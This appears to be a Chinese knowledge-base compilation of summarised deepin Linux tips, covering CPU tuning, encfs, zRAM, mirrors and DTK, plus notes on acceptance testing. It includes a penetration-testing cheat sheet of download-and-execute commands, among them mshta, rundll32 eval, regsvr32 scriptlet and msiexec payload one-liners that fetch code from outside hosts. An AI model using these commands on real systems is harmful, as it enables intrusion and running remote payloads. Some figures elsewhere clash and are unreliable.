命令行工具cpupower，deepin源可直接sudo apt install linux-cpupower，其他发行版可从deepin软件源获取。

gui工具cpupower-gui，ok源可直接sudo apt install cpupower-gui，deepin用户可去github或其他发行版仓库查找。

电脑调度器技术主要有cpufreq和pstate，6代以前intel cpu可能用cpufreq，之后可能用pstate，命令行可通过cpupower frequency-info查询。

cpufreq下调度器分三类，省电模式powersave尽可能低频率运行，可能锁死最低频率导致卡顿；平衡模式按需调节，如conservative等；性能模式performance尽可能高频率运行，可能锁死最高频率导致发热。

cpufreq全局省电模式：用sudo cpupower frequency-set -g powersave设调度，sudo cpupower frequency-set -d 800MHz设最低频率，需测试找合适数值。

cpufreq全局平衡模式推荐schedutil调度，需设上下限，命令为sudo cpupower frequency-set -g schedutil、-d 800MHz、-u 2000MHz。

cpufreq全局性能模式用sudo cpupower frequency-set -g performance设调度，调节最高频率减少发热，如sudo cpupower frequency-set -u 4000MHz。

pstate技术减少调度器种类，cpu频率按需调节，响应快，错配少，主流发行版支持，节能模式升频不激进重能效，性能模式升频激进重性能。

pstate技术下用sudo cpupower frequency-set -g powersave设调度，调节最高频率防过热，如sudo cpupower frequency-set -u 4000MHz。

以上cpu频率设置重启后失效，需重新设置，核心是调节调度和频率，使cpu在合适范围，最大频率设为90%或95%较合适。

标题：deepin系统配置与技巧汇总-2
Super键即WIN键，Deepin中可用于工作区切换等操作，如Super+S显示工作区，Super启动器等。

启动器搜索支持拼音，输入“xk”可显示“显卡驱动管理器”，支持简拼、全拼和模糊匹配。

控制中心-鼠标中打开“自然滚动”，可使笔记本触控板双指滚动与手机、macOS、Win10体验一致。

Chrome可右键标题栏去掉“使用系统标题栏和边框”，VSCode在设置中选“custom”标题栏样式，更美观。

从应用商店安装Timeshift制作系统快照，位置选/和/home外分区，用户建议包含隐藏文件，可通过命令行恢复。

APT命令可查找、重装软件等，如apt search查找，sudo apt install --reinstall重装，apt list看版本。

用which命令找命令路径，如which deepin-editor；dpkg -S可查所属软件包，如dpkg -S /usr/bin/deepin-editor。

系统假死时，按Alt+SysRq+B安全重启，SysRq即Print Screen键，有Fn键可能需同时按。

更换主机名：sudo deepin-editor /etc/hostname，替换新主机名后重启电脑。

进程相关命令：pgrep查ID，ps -ef |grep看进程信息，pkill杀掉进程，netstat查端口。

制作USB启动盘用sudo dd if=镜像路径 of=/dev/sdX，加status=progress显示进度。

Live模式修复GRUB引导：找到系统分区sdaX，挂载后chroot，执行update-grub和grub-install。

安装运行Windows绿色软件：进入目录右键“在终端中打开”，执行deepin-wine 软件.exe。

为大型Windows软件创建独立环境：拷贝容器或用WINEPREFIX创建，再用该前缀安装软件。

硬盘克隆可用Clonezilla，dd命令备用，如sudo dd if=/dev/sda1 of=elf.bak备份，压缩备份用gzip。

备份MBR用sudo dd if=/dev/sdX of=mbr.bak bs=512 count=1，还原用相同命令反向，还可备份分区表。

开机画面卡死，grub编辑模式修改行添加acpi_osi=! acpi="windows 2009"，或试nomodeset等参数。

关闭错误报警蜂鸣：临时用sudo rmmod pcspkr，永久可修改.profile或blacklist.conf。

测试显卡性能用vblank_mode=0 glxgears，FPS3000以上驱动正常，NVIDIA需关垂直同步。

标题：Linux系统上用encfs创建和管理加密文件夹
encfs允许创建加密文件夹，通过FUSE挂载作为用户文件系统，可在命令行使用。

Ubuntu或其衍生版本如Linux Mint，可通过sudo apt-get install encfs安装encfs。

用encfs创建加密文件夹需指定路径，如encfs ~/.tuxtweaks ~/tuxtweaks，会创建两个文件夹，.tuxtweaks存加密信息，tuxtweaks挂载解密版本。

创建新加密卷时，输入x进入专家配置模式，p进入预配置偏执模式，其他或空行选标准模式。

创建加密文件夹需输入密码，无密码找回机制，密码校验通过后文件夹创建并自动挂载。

加密文件夹挂载后与其他文件夹类似，偏执模式下硬链接不可用，解密文件在tuxtweaks，加密文件在.tuxtweaks且内容混乱。

卸载加密文件夹用fusermount命令，如fusermount -u ~/tuxtweaks，卸载后tuxtweaks目录为空。

重新挂载加密文件夹使用创建时的命令，如encfs ~/.tuxtweaks ~/tuxtweaks。

encfs加密文件夹可用于安全存储财务信息，如纳税申报表，及日志列表凭据等。

标题：Linux内存压缩技术
内存压缩是通过压缩内存节省空间，在内存紧张时减少IO操作，提升系统性能，处于内存回收部分。

Linux内核主流内存压缩技术有zSwap、zRAM、zCache。zSwap是memory与flash间的cache，zRAM用内存模拟block device，zCache压缩文件页。

内存压缩主流分配器有Zsmalloc、Zbud、Z3fold。Zsmalloc为ZRAM设计，Zbud存2个objects到1页，Z3fold存3个到1页。

zRAM压缩时机包括Kswapd场景（内存watermark低于low水线时唤醒）和Direct reclaim场景（内存分配进入slowpath）。

配置zRAM可通过echo命令设置压缩算法（如lz4）、大小（如2GB），启用需执行mkswap和swapon命令，还可设定块设备个数和压缩流最大个数。

swappiness参数范围0~100，值越大回收匿名页到swap的比例越大，默认60，可通过/proc/sys/vm/swappiness配置。

zRAM压缩率可通过/sys/block/zram/mm_stat中的orig_data_size和compr_data_size计算，单位为bytes。

zRAM并非配置越大越好，过大可能影响前台应用流畅度和导致内存碎片；低内存时kswapd占CPU高可通过优化压缩算法等改善。

标题：Linux系统上用encfs创建和管理加密文件夹-2
encfs允许创建加密文件夹，通过FUSE挂载作为用户文件系统，可在命令行使用。

Ubuntu或其衍生版本如Linux Mint，可用sudo apt-get install encfs安装encfs。

用encfs创建加密文件夹需指定路径，如encfs ~/.tuxtweaks ~/tuxtweaks，会创建两个文件夹，.tuxtweaks存加密信息，tuxtweaks挂载解密版本。

创建新加密卷时，输入p选高级加密，按Enter用标准选项，需设置密码且无找回机制。

加密文件夹挂载后与普通文件夹类似，paranoia模式下硬链接不可用，加密版本文件夹中文件名和内容混乱。

卸载encfs加密文件夹用fusermount命令，如fusermount -u ~/tuxtweaks，卸载后挂载点目录为空。

重新挂载encfs加密文件夹，使用创建时的相同命令，如encfs ~/.tuxtweaks ~/tuxtweaks。

encfs加密文件夹可用于安全存储财务信息、纳税申报表、日志列表凭据等。

标题：关于验收测试E2E分析方法的心路历程
验收测试工程师编写验收测试分析和用例时，易陷入传统思维，与内部测试内容无差异，虽知要写用户场景用例，实战仍走老套路。

验收测试工作的产物不是最终目的，在未深入理解需求等情况下忙碌，价值不高，后期需大量精力查漏补缺。

新同学或转做验收测试的，要冻结过往思维、清晰职责价值、了解项目背景等。

接触项目时，要从产品经理处获取项目原始信息，弄清背景与用户痛点。

验收测试分析推荐用思维导图，用例转化要抓住验证点不遗漏，执行时需思考用例本意。

用例生产的实物原料包括项目需求文档（必选）、需求原型等（可选）。

用例生产的思想原料包括熟悉软件研发流程、测试基本理论知识等。

深入理解项目背景要弄清楚项目产生原因、不做是否可行等问题，能流畅介绍给他人说明已理解。

梳理基本需求点可借助软件质量模型的6大特性，功能特性分析占80%以上内容和精力。

异常场景建议在完成主要分析后补充，可思考使用中关闭程序、断电等场景。

E2E场景用例是将多个功能点设计成操作流，意义是模拟用户操作路径，发现问题。

用户场景来源包括站在用户角度编写、一线人员反馈、分析用户特征构建等。

场景用例编写粒度需把握内部测试有详尽用例、步骤围绕核心目的等原则。

状态机有现态、条件、动作、次态4个要素，是数学模型。

可与一线人员或用户交流获取真实使用场景，无此条件可创造条件。

过程验收或抽验阶段，发现遗漏点要补充到用例，优化不合理之处等。

质检即评审过程，能发现遗漏和不足，避免后期问题。

标题：命令行终端下载指令大全(Win + Linux)
在渗透测试中，目标主机有网络连接时，可通过本地下载传输文件，本文汇总了Win与Linux常用下载指令。

Linux中Wget功能丰富，可恢复下载、下载多个文件等，直接下载命令为wget http://www.sample-videos.com/video/mp4/big.mp4。

Linux中Curl可上传或下载文件，支持多种协议，直接下载用curl -o um.mp4 http://www.sample-videos.com/video/mp4/big.mp4，-o指定保存名，-O用原始名。

Axel是wget的替代者，是轻量级下载工具，可加速下载，安装命令为apt-get install axel，直接下载用axel http://www.sample-videos.com/video/mp4/big.mp4。

Aria2是开源命令行下载加速器，支持多端口，安装用apt-get install aria2，直接下载命令为aria2c http://www.sample-videos.com/video/mp4/big.mp4。

Perl可实现文件下载，脚本为use LWP::Simple; getstore("http://domain/file", "file");，执行用perl test.pl。

Python可下载文件，代码为import urllib2; u = urllib2.urlopen('http://domain/file'); localFile = open('local_file', 'w'); localFile.write(u.read()); localFile.close()。

Ruby可实现文件下载，脚本需require 'net/http'，执行用ruby test.rb。

PHP可实现文件下载，脚本为<?php $data = @file("http://example.com/file"); $lf = "local_file"; $fh = fopen($lf, 'w'); fwrite($fh, $data[0]); fclose($fh); ?>，执行用php test.php。

Linux中FTP下载文件，非交互脚本为ftp 127.0.0.1、username、password、get file、exit；交互时可lcd进入本地目录，cd进入服务器目录，get下载。

Linux中Netcat下载文件，攻击者电脑用cat file | nc -l 1234，目标电脑用nc host_ip 1234 > file。

Windows中PowerShell下载文件的指令：$p = New-Object System.Net.WebClient; $p.DownloadFile("http://domain/file" "C:\%homepath%\file")。

Windows中IPC$传输文件可用copy \\192.168.3.1\c$\test.exe E:\file，或cmd.exe /k < \\webdavserver\folder\batchfile.txt。

Windows中Certutil下载文件命令：certutil -urlcache -split -f http://192.168.3.1/test.exe file.exe，删除缓存用certutil -urlcache -split -f http://192.168.3.1/test.exe delete。

Windows中Visual Basic下载文件需相应VBS脚本，Windows XP中执行用cscript test.vbs，Windows 7中不一定需要。

Windows Vista及以后版本有Tftp，下载命令为tftp -i IP地址 GET C:\%homepath%\file 本地存放位置。

Windows中Bitsadmin下载文件命令：bitsadmin /transfer myDownLoadJob /download /priority normal "http://192.168.203.140/b.ps1" "E:\phpstudy_pro\WWW\b.ps1"等。

Windows中msiexec下载执行命令：msiexec /q /i http://192.168.3.1/calc.png，calc.png由msfvenom生成。

Windows中IEExec使用前需执行C:\Windows\Microsoft.NET\Framework\v2.0.50727> caspol -s off，再用IEExec http://192.168.3.1/test.exe。

Windows中Python下载文件命令：C:\python27\python.exe -c “import urllib2; exec urllib2.urlopen(‘http://192.168.3.1/test.zip’).read();”。

Windows中Mshta下载执行可用mshta http://192.168.3.1/run.hta，或mshta vbscript:Close(Execute("GetObject(\"script:http://webserver/payload.sct\")"))。

Windows中Rundll32下载相关命令：rundll32.exe javascript:"\\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8081/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}。

Windows中Regsvr32可注册COM组件，下载相关命令如regsvr32 /u /s /i:http://192.168.3.1/test.data scrobj.dll，还可使用生成的sct文件。

Windows shares可加载驱动器，加载远程驱动命令：net use x: \\127.0.0.1\share /user:example.com\userID myPassword。

Nishang可将exe转hex再还原，exe转hex用.\ExetoText.ps1 evil.exe evil.txt，还原用.\TexttoExe.ps1 evil.text evil.exe。

Windows中esentutl.exe下载命令：esentutl.exe /y "\\172.16.249.149\share mimikatz_trunk.zip" /d"C:\Users\Public\mimikatz_trunk.zip" /0。

Windows中extrac32.exe下载命令：extrac32.exe /Y /C \\172.16.249.149\share\test.txt C:\Users\Public\test.txt。

Win10中desktopimgdownldr.exe可下载文件，普通用户命令：set "SYSTEMROOT=C:\ProgramData\" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://url/xxx.exe /eventName:desktopimgdownldr。

标题：软件源
官方软件仓库地址为https://community-packages.deepin.com/deepin/

中国淡江大学（台湾）提供的软件仓库http地址为http://ftp.tku.edu.tw/Linux/Deepin/deepin/

华为云的软件仓库https地址是https://mirrors.huaweicloud.com/deepin/

阿里云的软件仓库http地址为http://mirrors.aliyun.com/deepin

网易的软件仓库http地址是http://mirrors.163.com/deepin/

搜狐的软件仓库http地址为http://mirrors.sohu.com/deepin

清华大学的软件仓库http地址是http://mirrors.tuna.tsinghua.edu.cn/deepin/

浙江大学的软件仓库http地址为http://mirrors.zju.edu.cn/deepin/

兰州大学提供https和ftp两种软件仓库地址，分别是https://mirror.lzu.edu.cn/deepin/和ftp://mirror.lzu.edu.cn/deepin/

中国科学技术大学的软件仓库http地址是http://mirrors.ustc.edu.cn/deepin/

中国互联网络信息中心的软件仓库https地址为https://mirrors.cnnic.cn/deepin/

北京外国语大学的软件仓库http地址是http://mirrors.bfsu.edu.cn/deepin/

上海交通大学有http和ftp两种软件仓库地址，分别是http://ftp.sjtu.edu.cn/deepin/和ftp://ftp.sjtu.edu.cn/deepin/

华中科技大学的软件仓库http地址为http://mirrors.hust.edu.cn/deepin/

南京大学提供http和https两种软件仓库地址，分别是http://mirrors.nju.edu.cn/deepin/和https://mirrors.nju.edu.cn/deepin/

哈尔滨工业大学有http和httpv4两种软件仓库地址，分别是http://mirrors.hit.edu.cn/deepin/和http://mirrors4.hit.edu.cn/deepin

吉林大学提供http和https两种软件仓库地址，分别是http://mirrors.jlu.edu.cn/deepin/和https://mirrors.jlu.edu.cn/deepin/

比利时Belnet的软件仓库http地址为http://ftp.belnet.be/mirror/deepin/

巴西Federal University of Parana (UFPR)有http和https两种软件仓库地址，分别是http://deepin.c3sl.ufpr.br/deepin/和https://deepin.c3sl.ufpr.br/deepin/

软件仓库同步命令为rsync -av --delete-after rsync.deepin.com::deepin/ /var/www/deepin/，所需大小400GB

ISO仓库同步命令为rsync -av --delete-after rsync.deepin.com::releases/ /var/www/deepin-cd/，所需大小60GB

提供镜像源建议优先同步软件仓库，再同步ISO仓库

提供镜像源可将/var/www/路径移到服务器根目录下

提供镜像源建议添加每天运行的cron任务以保持最新

镜像源相关目录不要存放其他文件，避免误会

有建议和意见可反馈至support@deepin.com

可到wiki:软件源添加或提交仓库

标题：软件源替换教程
软件源是Linux系统免费的应用程序安装仓库，分软件仓库（二进制包和源代码）和ISO仓库（发行版ISO文件）。

深度操作系统官方软件源地址：http://packages.deepin.com/，其中pool/目录存已发布版软件包，project/存开发人员资源。

深度操作系统软件源配置文件为/etc/apt/sources.list，含软件源地址描述信息，软件获取需联网。

深度操作系统用apt-get命令管理软件，基于Ren Hat的多数Linux用yum，少数有自己的包管理系统。

终端执行sudo gedit /etc/apt/sources.list可查看当前系统的源文件。

深度操作系统15默认软件源：deb [by-hash=force] http://packages.deepin.com/deepin stable main contrib non-free，#deb-src开头为注释的源码包地址。

deb表示二进制软件包，deb-src表示源码包，含源程序编码等。

修改软件源方法：1.控制中心—系统信息—设置—更新源（更改）选择；2.终端sudo edit /etc/apt/sources.list手工修改，改后需sudo apt-get update刷新。

同步软件仓库用rsync -av --delete-after rsync.deepin.com::deepin/ /var/www/deepin/，大小约330GB；同步ISO仓库用rsync -av --delete-after rsync.deepin.com::releases/ /var/www/deepin-cd/，约520GB。

同步软件源备注：可移/var/www/路径到服务器根目录；添加每天cron任务保持最新；优先同步软件仓库再ISO仓库；不存放其他文件；意见反馈至support@deepin.org。

相关链接：[深度操作系统镜像源页面](http://www.deepin.org/mirror.html)

标题：镜像源
官方ISO仓库地址为http://cdimage.deepin.com/

淡江大学（台湾）提供的ISO仓库http地址为http://ftp.tku.edu.tw/Linux/Deepin/deepin-cd/

华为云的ISO仓库https地址为https://mirrors.huaweicloud.com/deepin-cd/

阿里云的ISO仓库http地址为http://mirrors.aliyun.com/deepin-cd

网易的ISO仓库http地址为http://mirrors.163.com/deepin-cd/

清华大学的ISO仓库http地址为http://mirrors.tuna.tsinghua.edu.cn/deepin-cd/

比利时Belnet的ISO仓库http地址为http://ftp.belnet.be/mirror/deepin-cd/

巴西Federal University of Parana (UFPR)的ISO仓库https地址为https://deepin.c3sl.ufpr.br/deepin-cd

保加利亚Netix Ltd的ISO仓库rsync地址为https://mirrors.netix.net/deepin-cd/

软件仓库同步命令为rsync -av --delete-after rsync.deepin.com::deepin/ /var/www/deepin/

ISO仓库同步命令为rsync -av --delete-after rsync.deepin.com::releases/ /var/www/deepin-cd/

软件仓库所需大小为400GB

ISO仓库所需大小为60GB

中国科学技术大学的ISO仓库https地址为https://mirrors.ustc.edu.cn/deepin-cd/releases/

德国FAU Erlangen-Nürnberg的ISO仓库ftp地址为ftp://ftp.fau.de/deepin/

日本JAIST的ISO仓库rsync地址为http://ftp.jaist.ac.jp/pub/Linux/deepin-cd/

英国Bytemark Hosting的ISO仓库ftp地址为ftp://mirror.bytemark.co.uk/linuxdeepin/releases/

美国Linux Kernel Archives的ISO仓库rsync地址为https://mirrors.kernel.org/deepin

乌拉圭Centro Universitario Regional del Este的ISO仓库https地址为https://deepin.repo.cure.edu.uy/isos/

反馈建议和意见可发送至support@deepin.com

标题：DTK（developer toolkit）开发者工具套件
dtkdeclarative 开发控件库用于构建原生的行云设计风格应用程序，基于 Qt Quick 和 Qt Qml 基础框架，代码设计借鉴 qtdeclarative 并实现 Qt Quick Controls 2 全控件覆盖，拓展了颜色风格、视觉特效等特性。

dtkdeclarative 基于 Qt Quick，dtkwidget 基于 Qt Widgets。Qt Widgets 使用 C++，Qt Quick 使用 QML；Qt Widgets 适合桌面应用，兼容低性能硬件；Qt Quick 适用于桌面和移动端，触控交互和动效体验有优势，需更多硬件性能。

dtkwidget 实现100x100红色矩形需重写 paintEvent，用 QPainter 绘制；dtkdeclarative 则通过 Rectangle 组件设置宽高和颜色。

dtkwidget 用 QHBoxLayout、QVBoxLayout 等布局；dtkdeclarative 可使用锚布局和布局器，如 RowLayout 并设置 Layout 附加属性。

dtkwidget 用 QObject::connect 连接按钮点击事件；dtkdeclarative 可通过 on<Signal> 或 Connections 方式，5.15以上版本 Connections 用 function 定义信号处理。

dtkdeclarative 模块包括 org.deepin.dtk.impl、org.deepin.dtk.controls、org.deepin.dtk.style、org.deepin.dtk.settings、org.deepin.dtk，其中 settings 和 dtk 模块为公开。

DCI图标是.dci后缀的归档打包格式，mimetype为image/dci，继承于application/octet-stream，magic值为DCI，能满足多种交互状态、图标类型和DPI缩放需求。

ColorSelector 由调色板、控件属性和取舍器组成，替代 QPalette 实现颜色管理扩展，Palette 可指定正常、悬停等状态颜色，区分明暗主题，控制启用状态，使用颜色族，兼容 QPalette。

dtkdeclarative 的 Settings 框架用树状视图代码风格，替代 dtkwidget 中基于Json的SettingDialog，Config配置项可关联到SettingDialog，实现设置选项与配置选项打通，支持属性绑定。

标题：Deepin系统管理整合
系统启动流程：简述Linux系统的启动流程。

系统引导器：系统引导器的简单介绍。参考 Debian、Arch wiki。

Linux内核：简述Linux内核构成与安装。参考 Arch wiki。

Linux内核错误：Linux内核错误(内核恐慌)的介绍与处理。

初始化：Linux系统初始化过程简述。

开机动画：简述开机动画的作用和程序类型。

电源管理：简单介绍Linux下的电源管理与类型。

用户与群组：简单介绍Linux系统用户与群组的定义。

用户与任务：简单介绍Linux系统的用户与任务的关系。

文件与目录：简单介绍Linux系统文件的定义和常见管理。

文件与目录权限：简单介绍Linux系统的文件权限管理。

文件系统：常见的本地/网络文件系统介绍。

挂载：Linux挂载点定义与管理。

磁盘管理：简单介绍磁盘分割、删除和格式化等各种管理。

程序与进程：简单介绍程序与进程的概念与关系。

进程管理：Linux系统下的进程管理。

软件通用配置：简单介绍Linux下的通用软件配置文件。

自启动程序：Linux下自启动程序的设置。

Desktop Entry 文件：Linux下通用的Desktop文件配置详解。

软件源：简单介绍Linux系统软件源的定义和修改。

源代码包：简单的介绍源代码包的编译安装与卸载。

二进制包：简单介绍Linux下各种二进制包的安装与卸载。

软件包：Linux系统软件包系统的简单介绍。

软件包管理：dpkg包管理工具的使用与常见问题处理。

系统服务：简单介绍Linux系统默认的系统服务和管理。

系统服务配置：简单介绍Linux下的系统内置服务的配置。

Samba服务：简单介绍Linux下Samba服务与配置。

SSH服务：简单介绍Linux下SSH(安全壳协议)服务与配置。

FTP服务：简单介绍Linux下FTP(文件传输协议)服务与配置。

DHCP服务：简单介绍Linux下DHCP(动态主机设置协议)服务与配置。

DNS服务：简单介绍Linux下DNS(域名系统)服务与配置。

VPN服务：简单介绍Linux下VPN(虚拟专用网)服务与配置。

LAMP服务：Linux WEB服务器组合套装(Linux+Apache+MySQL+PHP)。

登录管理器：简单介绍Linux系统下登录管理器介绍与常见设置。

Shell：简单介绍Shell的分类——命令Shell和图形Shell。

图形服务器：简单介绍Linux下常见的图形服务器。

桌面环境：简单介绍桌面环境的构成和类型。

窗口管理器：简单介绍窗口管理器的构成和类型。

命令shell：简单介绍命令Shell。

窗口主题：简单介绍如何安装与设置窗口主题。

图标主题：简单介绍如何安装与设置图标主题。

光标主题：简单介绍如何安装与设置光标主题。

音效主题：简单介绍如何设置开机音乐。

壁纸：简单介绍如何设置壁纸。

字体：简单介绍如何管理字体。参考 Arch wiki。

系统语言：调整系统语言，以适应不同语言需求。参考 Arch wiki:Locale。

时间和时区：系统时间和时区的设置。

网络基础：网络基础知识介绍。

网络管理：常见的网络相关管理。

有线网络：有线网络的设置与管理。

拨号网络：拨号网络的设置与管理。

移动网络：移动网络的设置与管理。

VPN：VPN的设置与管理。

代理：代理的设置与管理。

认证客户端：常见的认证客户端解决方案。

系统日志：系统日志的介绍与管理。

系统死机：系统死机的处理。

基础硬件：计算机基础硬件的组成介绍。

处理器：处理器的介绍与信息查询。

硬盘：硬盘的介绍与管理。

内存：内存的介绍与信息查询。

主板：主板的介绍与信息查询。

显卡：显卡的介绍与驱动管理。

声卡：声卡的介绍与常见问题的解决。

网卡：有线/无线网卡的介绍与常见问题的解决。

显示器：显示器的介绍与多屏管理。

触摸板：触摸板的介绍与控制。

电池/电源：电源的介绍。

蓝牙：蓝牙的介绍与管理。

光驱：光驱的介绍与信息查询。

USB设备：Linux下USB设备的介绍与通用管理。

鼠标：鼠标的介绍与调节。

小红帽：小红帽的介绍与调节。

键盘：键盘的介绍与调节。

打印机：打印机的介绍与配置。

U盘：U盘的介绍与管理。

标题：DTK(DevelopmentToolKit)
DTK是统信基于Qt开发的通用开发框架，位于统信UOS系统核心位置。

DTK已完成5个版本迭代，108+次更新，累计提交代码近20万行，已被迁移至超过10个Linux发行版。

DTK提供丰富接口与工具，满足图形、业务、系统定制应用开发需求，提升效率，支持跨平台、跨架构开发。

DDE 30+组件，如统信UOS浏览器、音乐、邮件等40余款原生应用全部使用DTK开发。

DTK覆盖Qt控件50+，自定义控件10+，提供现代化UI高级特性，统一样式。

DTK支持3大操作系统(统信UOS、Windows、MacOS)，4大CPU架构7个CPU品牌，实现“一次研发，多平台、多架构复用”。

DTK可快速生成项目模板，支持常用代码调试，具备性能剖析和反向调试功能。

DTK包含3个核心模块、180+个类、2000+函数接口，可无缝融合Qt的14个辅助功能模块。

DTK有应用和桌面扩展接口模块10+个，满足多种应用开发需求。

DTK代码开源，社区开放，提供丰富文档，被迁移至10余个Linux发行版，接收100余次外部贡献，有200+外部开发者贡献。

DTK通过开发教程、线上培训、高校合作赋能开发者，建立以统信UOS为核心、DTK为基础的开发生态圈。

标题：使用入门
初次进入深度操作系统，可见干净壁纸桌面及下方dock栏，点击图标运行应用，不熟悉图标可悬停看提示，右键dock栏可设高效模式。

按F1键可呼出深度操作系统的帮助手册，浏览手册能让操作事半功倍，遇问题可再次打开查找答案。

确保网线插好或无线网卡打开后，查看dock栏是否有网口或WiFi图标，点击进入网络设置并按提示操作。网卡有问题可到深度百科搜网卡词条或深度论坛求助。

除dock栏显示的图标，点击启动器图标可浏览所有已安装应用，启动器类似安卓桌面应用浏览器，可直接点击运行程序，也可将程序放到dock或桌面。

在dock栏或启动器中找到深度商店图标，打开后可浏览并安装常用程序。对商店使用有疑问按F1打开其帮助手册，所有带深度前缀的应用都可用F1打开对应帮助手册。

深度操作系统预装了chome浏览器，可打开浏览网页，也可在商店下载其他浏览器访问因特网。

深度操作系统淡化了盘符概念，自带的深度文件管理器可让电脑文件管理有序。

从dock栏打开控制中心可检查系统更新，有新版本可更新，过程中可熟悉控制中心设置内容。

在启动器中搜索深度或者deepin，可找到很多深度开发的基础常用应用，今后会经常用到。

标题：深度桌面介绍
深度操作系统是深度科技发行的美观易用、安全可靠的国产桌面操作系统，预装了WPS Office、搜狗输入法、有道词典及深度特色应用。

在桌面上点击鼠标右键，可新建文件夹及常用文档，也能对文件进行复制、剪切、重命名等操作。

桌面文件排序方式有按名称、大小、类型、修改时间，还可勾选自动排列，图标会自动缩进。

在桌面右键点击显示设置，可快速进入控制中心设置显示器的分辨率、亮度。

热区设置步骤：桌面右键点击热区设置，屏幕变暗显示四角热区功能，鼠标放角落选功能，空白处点击退出。默认左上角开启动器，右下角打开控制中心。

设置壁纸：桌面右键点击设置壁纸，底部预览选择，可设为桌面、锁屏或两者，也可选择仅设置桌面/锁屏。

任务栏由启动器、应用图标、托盘区、关机按钮、系统时间等组成，台式机显示电源图标，笔记本显示电池图标及电量。

任务栏显示模式有时尚模式（类Mac OS托盘式）和高效模式（类Windows 7小长条式），可右键任务栏空白处在模式子菜单选择。

任务栏可调整位置（任意方向）、大小，可设置一直显示、一直隐藏、智能隐藏，右键任务栏相应选项设置。

关机界面可进行关机、重启、待机、锁定（Win+L）、切换用户、注销操作，点击任务栏电源图标进入。

回收站可恢复或清空删除文件，时尚模式固定在任务栏，高效模式可在启动器打开或创建桌面快捷方式。

启动器管理所有应用，新安装应用旁有小蓝点，可拖拽排列或按分类排列，搜索框输入关键字查找应用。

启动器中可将应用发送到桌面、任务栏，设为开机启动，也可移除这些快捷方式，运行状态应用可右键任务栏图标驻留。

启动器中打开应用可点击图标或右键选择打开，卸载应用可右键点击卸载，时尚模式下也可拖拽到回收站卸载。

控制中心管理系统设置，鼠标移至屏幕右下角打开，首页有顶部信息栏、应用控件栏、系统控件栏、底部工具栏。

控制中心可创建新账户，需输入用户名、密码，授权后添加；可修改账户头像、密码，设置自动登录或删除账户。

显示设置可调节单屏分辨率、屏幕方向（顺时针旋转90°/次），多屏有复制、扩展、只在xxx、自定义模式。

默认程序设置可选择、添加、删除（仅添加的）默认程序，系统默认程序需卸载应用删除。

个性化设置可设置窗口、图标、光标主题，调节系统显示字体类型和大小。

蓝牙设置可开关蓝牙、修改名称（修改后需重新搜索），扫描连接设备，在我的设备中可断开或忽略。

网络设置支持有线、无线（含隐藏网络）、移动网络、宽带连接、VPN、系统代理，可查看网络信息。

声音设置可开关扬声器、麦克风，调节音量、声道平衡，设置系统音效和高级输入输出模式。

日期和时间可开启自动同步，手动设置（关闭自动同步），添加、编辑时区列表。

电源管理可设置显示器休眠时间、休眠后锁屏时间，开启睡眠后需密码等安全设置，笔记本有合盖睡眠选项。

鼠标和触控板可设置左手使用（左右键互换）、自然滚动等，调节双击和指针移动速度。

键盘和语言可设置键盘属性（重复延迟、速度等），添加、删除、切换键盘布局，设置系统语言和快捷键。

系统信息可查看系统版本、位数、CPU、内存、硬盘信息，查看版权协议，设置启动菜单（顺序、背景）。

更新设置可开启自动更新，切换服务器，检查、下载、安装系统和应用更新，升级中勿强制关机。

窗口管理器按Win+S打开工作区，最多7个，可切换、移动、关闭窗口，添加、命名、删除工作区。

工作区切换可按Win+←/→，管理界面滚动鼠标或按Alt+数字键，退出可按Esc或Win+S等。

桌面窗口切换可按Alt+Tab（向右）、Alt+Shift+Tab（向左），同类型窗口按Alt+～等组合键。

标题：Cairo-Dock
Cairo-Dock是一个Dock类软件，支持OpenGL、提供动画及视觉效果的插件、新的Applet、重写配置面板、新增主题等功能。

安装Cairo-Dock的命令是sudo apt-get install cairo-dock。

卸载Cairo-Dock的命令是sudo apt-get remove cairo-dock。

Cairo-Dock的仓库地址是http://packages.deepin.com/deepin/pool/main/c/cairo-dock/。

标题：Dock去掉图标
解决deepin15.4无法去除dock上的关机、音量、网络、时间等图标问题，可通过重命名/usr/lib/dde-dock/plugins目录下的链接库实现。

去掉声音图标可执行命令：mv libsound.so libsound.so.bak。

libdatetime.so对应日期时间图标。

libdde-trash-plugin.so对应垃圾箱图标。

libnetwork.so对应网络连接图标。

libshutdown.so对应关机电源图标。

libdde-disk-mount-plugins.so对应插入硬盘时的挂载图标。

libsystem-tray.so对应系统托盘图标。

要去掉Dock上的图标，需操作/usr/lib/dde-dock/plugins目录下的链接库。

标题：Dock插件开发
深度桌面环境中Dock对外提供API文档，开发者可开发插件扩展其功能，一个插件由图标、Tooltip、Popup和菜单等组成。

开发Dock插件前需安装必要包和工具，终端命令：sudo apt-get install dde-dock-dev build-essential qt5-qmake qt5-default qtcreator，qt5-default为可选。

打开QtCreator创建“Qt Plugin”新项目，如“helloworld”，创建“HelloWorldPlugin”类作为入口，需修改类继承关系为QObject和PluginsItemInterface。

修改项目模板时，需删除helloworld.pro中的DESTDIR一项，否则编译会报错。

PluginItemInterface的pluginName方法返回插件名字，需保证唯一性；itemWidget提供图标，返回QWidget；itemTipsWidget提供Tooltip，一般是QLabel。

init函数用于初始化Dock插件，通过PluginProxy的itemAdded方法告知Dock添加图标。

编译成功后，将生成的libhelloworld.so放到/usr/lib/dde-dock/plugins/目录，重新启动Dock即可看到新插件。

添加Popup需新建继承自QWidget的类，如HelloPopup，创建其实例并在相应方法中返回。

Dock插件添加右键菜单需实现itemContextMenu和invokedMenuItem函数，前者提供菜单项内容，后者处理触发事件，还需调用PluginProxy的requestContextMenu方法。

若没有xeyes程序，需在终端执行sudo apt-get install x11-apps命令安装。

标题：DTK 的历史起源、发展，和简单入门
DTK（deepin tool kit 后改为 Development ToolKit）全称是深度工具套件；是基于 Qt5 开发的一整套界面美观且实用的 UI 图形库。

DTK 目前分为三个模块，dtkcore、dtkgui、dtkwidget。dtkcore 提供应用程序开发中的工具类；dtkgui 包含开发图形用户界面所需功能，控制窗口主题等；dtkwidget 提供各种 dtk 基础控件。

2015 年，开发 deepin v15 版本时，从控制中心开发中抽象出 dui 控件库，仓库名称为 dui。

16 年初，dui 改名为 deepin-tool-kit 项目。

